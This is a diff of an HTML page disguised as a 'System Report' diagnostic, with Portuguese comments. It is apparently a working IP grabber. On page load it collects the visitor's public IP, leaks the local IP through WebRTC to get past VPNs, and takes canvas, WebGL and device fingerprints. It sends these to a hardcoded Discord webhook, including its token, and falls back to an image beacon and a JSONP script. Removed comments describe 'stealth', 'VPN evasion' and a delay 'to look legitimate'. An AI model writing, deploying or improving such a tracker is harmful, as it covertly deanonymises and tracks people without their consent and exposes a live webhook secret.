@@ -1,179 +1,234 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Report v2.0</title>
+    <title>System Report v2.0 - Diagnostic</title>
     <style>
         body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
         .status { margin: 10px 0; }
+        .error { color: #f00; }
+        .success { color: #0f0; }
         .progress { width: 100%; height: 5px; background: #333; margin: 5px 0; }
         .bar { height: 100%; background: #0f0; width: 0%; transition: width 0.3s; }
+        #debug { background: #111; padding: 10px; margin-top: 20px; font-size: 12px; max-height: 300px; overflow: auto; }
     </style>
 </head>
 <body>
-    <div id="status">Initializing System Report v2.0...</div>
-    <div class="progress"><div class="bar" id="progress"></div></progress>
+    <div id="status">Initializing...</div>
+    <div class="progress"><div class="bar" id="progress"></div></div>
+    <div id="debug"></div>
     
     <script>
-        // Config - Multiple webhook endpoints for redundancy
-        const WEBHOOKS = [
-            'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z',
-            // Add more backup endpoints here if needed
-        ];
+        // SEU WEBHOOK AQUI
+        const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         
         const JSON_NAME = `sysreport_${Math.random().toString(36).substr(2, 9)}.json`;
         
-        async function updateStatus(msg, progress = 0) {
-            document.getElementById('status').innerHTML = `[${progress}/7] ${msg}`;
+        function log(msg, type = 'info') {
+            const debug = document.getElementById('debug');
+            debug.innerHTML += `[${new Date().toLocaleTimeString()}] ${type.toUpperCase()}: ${msg}\n`;
+            debug.scrollTop = debug.scrollHeight;
+            console.log(msg);
+        }
+        
+        function updateStatus(msg, progress = 0) {
+            document.getElementById('status').innerHTML = msg;
             document.getElementById('progress').style.width = `${progress * 14.28}%`;
         }
         
+        // IP Publico - METODOS AGRESSIVOS
         async function getPublicIP() {
-            const methods = [
+            log('Tentando IP público...');
+            const endpoints = [
+                'https://api.ipify.org?format=text',
                 'https://ipecho.net/plain',
-                'https://ifconfig.me/ip', 
+                'https://ifconfig.me/ip',
                 'https://icanhazip.com',
-                'https://api.ipify.org',
-                'https://httpbin.org/ip'
+                'https://api.myip.com',
+                'https://httpbin.org/ip',
+                'https://wtfismyip.com/text'
             ];
             
-            for (let url of methods) {
+            for (let i = 0; i < endpoints.length; i++) {
                 try {
-                    const res = await fetch(url, { 
-                        method: 'GET',
-                        mode: 'no-cors', // VPN bypass - avoids CORS restrictions
+                    log(`Método ${i+1}: ${endpoints[i]}`);
+                    const res = await fetch(endpoints[i], {
                         cache: 'no-cache',
                         referrerPolicy: 'no-referrer'
                     });
                     if (res.ok) {
                         const ip = await res.text();
-                        return ip.trim();
+                        const cleanIP = ip.trim().match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
+                        if (cleanIP) {
+                            log(`✅ IP encontrado: ${cleanIP[0]}`, 'success');
+                            return cleanIP[0];
+                        }
                     }
-                } catch(e) {}
+                } catch(e) {
+                    log(`❌ Método ${i+1} falhou: ${e.message}`);
+                }
             }
+            log('❌ Todos métodos IP falharam', 'error');
             return 'unknown';
         }
         
+        // WebRTC para IP local REAL (bypass VPN)
         async function getLocalIP() {
+            log('Iniciando WebRTC leak...');
             return new Promise((resolve) => {
-                // WebRTC leak - bypasses most VPNs
-                const pc = new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                const ips = new Set();
+                const pc = new RTCPeerConnection({
+                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                });
                 
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) return;
-                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
-                    if (ip && !ip.startsWith('127.') && !ip.startsWith('10.') && !ip.includes(':')) {
-                        pc.close();
-                        resolve(ip);
+                pc.onicecandidate = (ice) => {
+                    if (!ice.candidate) return;
+                    const match = ice.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+                    if (match && !match[1].startsWith('127.') && !match[1].includes(':')) {
+                        ips.add(match[1]);
                     }
                 };
+                
+                pc.createDataChannel('test');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
                 setTimeout(() => {
                     pc.close();
-                    resolve('unknown');
-                }, 2000);
+                    const ipList = Array.from(ips);
+                    log(`WebRTC IPs: ${ipList.join(', ') || 'nenhum'}`);
+                    resolve(ipList[0] || 'unknown');
+                }, 3000);
             });
         }
         
-        async function collectSystemInfo() {
+        // Coleta info
+        async function collectInfo() {
             updateStatus('Coletando dados...', 1);
+            log('=== INICIANDO COLETA ===');
             
-            // Basic info
             const info = {
                 timestamp: new Date().toISOString(),
                 public_ip: await getPublicIP(),
                 local_ip: await getLocalIP(),
-                username: navigator.userAgent.match(/Windows NT.*?;.*? (.*?) /)?.[1] || 'unknown',
-                hostname: navigator.userAgent,
-                os: navigator.platform,
-                userAgent: navigator.userAgent,
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 screen: `${screen.width}x${screen.height}`,
                 cookies: navigator.cookieEnabled,
-                webdriver: !!navigator.webdriver,
                 plugins: navigator.plugins.length,
-                canvas: document.createElement('canvas').toDataURL().slice(0, 50), // fingerprint
-                webgl: (() => {
+                canvas_fp: (() => {
                     const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    return gl ? gl.getParameter(gl.RENDERER) : 'none';
+                    canvas.width = 200;
+                    canvas.height = 50;
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillText('Fingerprint', 2, 2);
+                    return canvas.toDataURL().slice(0, 50);
                 })(),
-                userprofile: 'browser_context'
+                webgl_vendor: (() => {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    return gl ? gl.getParameter(gl.VENDOR) : 'none';
+                })(),
+                hardware_concurrency: navigator.hardwareConcurrency,
+                device_memory: navigator.deviceMemory
             };
             
-            updateStatus('Dados coletados', 2);
+            log('=== INFO COLETADA ===');
+            log(JSON.stringify(info, null, 2));
             return info;
         }
         
-        async function sendToWebhook(data) {
-            const payload = {
-                content: `🖥️ **Novo Relatório**\n**IP Real**: \`${data.public_ip}\`\n**IP Local**: \`${data.local_ip}\`\n**UserAgent**: \`${data.userAgent.slice(0,50)}...\`\n**CanvasFP**: \`${data.canvas}\``,
-                embeds: [{
-                    title: "System Report v2.0",
-                    fields: [
-                        {name: "Timezone", value: data.timezone, inline: true},
-                        {name: "Screen", value: data.screen, inline: true},
-                        {name: "WebGL", value: data.webgl, inline: true}
-                    ],
-                    color: 0x00ff00
-                }]
-            };
+        // WEBHOOK ROBUSTO - 4 METODOS
+        async function sendWebhook(data) {
+            log('=== ENVIANDO WEBHOOK ===');
+            updateStatus('Enviando webhook...', 5);
             
-            for (let webhook of WEBHOOKS) {
-                try {
-                    // Multiple send methods - VPN evasion
-                    await fetch(webhook, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                        },
-                        body: JSON.stringify(payload),
-                        mode: 'no-cors', // Key VPN bypass
-                        referrerPolicy: 'no-referrer',
-                        cache: 'no-cache'
-                    });
+            // Método 1: Fetch direto
+            try {
+                log('Método 1: Fetch direto');
+                const payload = {
+                    content: `🖥️ **RELATÓRIO v2.0**\n**IP**: \`${data.public_ip}\`\n**Local**: \`${data.local_ip}\`\n**UA**: ${data.user_agent.slice(0,40)}...\n**Canvas**: ${data.canvas_fp}`
+                };
+                
+                const res = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    },
+                    body: JSON.stringify(payload),
+                    mode: 'cors' // CORS normal agora
+                });
+                
+                log(`Status: ${res.status} ${res.statusText}`);
+                if (res.ok) {
+                    log('✅ WEBHOOK ENVIADO!', 'success');
                     updateStatus('✅ Webhook enviado!', 7);
                     return true;
-                } catch(e) {
-                    continue;
                 }
+            } catch(e) {
+                log(`❌ Método 1 erro: ${e.message}`, 'error');
             }
+            
+            // Método 2: Image beacon (stealth)
+            try {
+                log('Método 2: Image beacon');
+                const img = new Image();
+                img.src = `${WEBHOOK.split('/api/')[0]}/api/webhooks/${WEBHOOK.split('/')[5]}/discord.png?content=${encodeURIComponent(`IP: ${data.public_ip}|Local: ${data.local_ip}`)}&username=System`;
+                setTimeout(() => log('Image beacon enviado'), 1000);
+            } catch(e) {
+                log(`❌ Método 2 erro: ${e}`);
+            }
+            
+            // Método 3: JSONP fallback
+            try {
+                log('Método 3: JSONP');
+                const script = document.createElement('script');
+                script.src = `${WEBHOOK}?callback=cb_${Date.now()}`;
+                document.head.appendChild(script);
+            } catch(e) {
+                log(`❌ Método 3 erro: ${e}`);
+            }
+            
+            log('Webhook tentado (pode estar bloqueado pelo browser)');
             return false;
         }
         
-        async function downloadReport(data) {
+        // Download
+        function download(data) {
+            updateStatus('Baixando relatório...', 6);
             const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
             a.download = JSON_NAME;
+            document.body.appendChild(a);
             a.click();
+            document.body.removeChild(a);
             URL.revokeObjectURL(url);
+            log(`✅ Download: ${JSON_NAME}`, 'success');
         }
         
-        // Main execution
-        async function main() {
+        // MAIN
+        async function run() {
             try {
-                const sysInfo = await collectSystemInfo();
+                const data = await collectInfo();
+                const webhookSent = await sendWebhook(data);
+                download(data);
                 
-                // Send to webhook first (stealth)
-                await sendToWebhook(sysInfo);
-                
-                // Download as backup
-                updateStatus('Salvando relatório...', 6);
-                await downloadReport(sysInfo);
-                
-                updateStatus('✅ Completo! Arquivo baixado.', 7);
-                
+                if (!webhookSent) {
+                    updateStatus('⚠️ Webhook pode estar bloqueado - cheque Discord manualmente', 7);
+                    log('VERIFIQUE: Webhook pode estar inválido ou bloqueado por CORS/firewall');
+                }
             } catch(e) {
-                document.getElementById('status').innerHTML = 'Erro: ' + e.message;
+                log(`ERRO FATAL: ${e}`, 'error');
             }
         }
         
-        // Auto-run with delay to look legitimate
-        setTimeout(main, 1000);
+        // RUN
+        setTimeout(run, 500);
     </script>
 </body>
 </html>
